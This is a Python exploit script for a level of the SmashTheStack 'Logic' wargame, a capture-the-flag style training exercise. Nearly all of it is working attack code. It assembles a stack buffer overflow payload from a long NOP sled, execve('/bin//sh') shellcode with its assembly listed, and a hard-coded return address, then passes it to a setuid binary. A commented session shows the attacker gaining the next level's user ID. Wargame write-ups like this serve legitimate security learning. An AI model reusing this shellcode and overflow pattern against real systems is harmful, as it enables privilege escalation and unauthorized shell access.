#!/usr/bin/env python
# -*- coding: utf-8 -*-

# (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com

'''
Level 2, Logic Wargame, SmashTheStack

buffer overflow

$ id
uid=604(level2) gid=604(level2) groups=604(level2),615(nosu)
$ python level2.py
�[...]�1�Ph//shh/bish-3.2$ id
uid=602(level3) gid=604(level2) groups=604(level2),615(nosu)
'''

import os

level2 = 'fsckmelogic '
nop = '\x90'
'''
xor     eax, eax
push    eax
push    68732F2Fh
push    6E69622Fh
mov     ebx, esp
push    eax
push    ebx
mov     ecx, esp
cdq
mov     al, 0Bh
int     80h	; LINUX - sys_execve
'''
shellcode = '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
'''
0xbfffcd34
'''
ret = '\x34\xcd\xff\xbf'
payload = level2 + nop * 4084 + shellcode + ret

os.system('/levels/level2/level2 ' + payload)
